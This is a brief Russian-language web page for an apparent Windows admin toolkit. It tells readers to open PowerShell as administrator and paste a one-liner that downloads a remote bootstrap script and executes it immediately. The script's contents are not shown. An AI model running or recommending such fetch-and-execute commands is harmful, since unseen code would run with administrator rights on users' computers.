Raccoon Admin Toolkit

Здрасте. Но это только для Windows.

Это не обычный сайт, а служебный набор диагностических PowerShell-инструментов для технических специалистов.

Не запускайте его в браузере, на телефоне или на macOS. Нужен компьютер с Windows и Windows PowerShell 3.0 или новее.

Как запустить

  1. Откройте Windows PowerShell от имени администратора.
  2. Скопируйте команду ниже целиком.
  3. Вставьте её в PowerShell и нажмите Enter.
irm https://admintoolkit.itraccoonverse.space/bootstrap.ps1 | iex

После завершения работы выберите пункт выхода в меню.

Инструмент предназначен только для авторизованных технических специалистов.
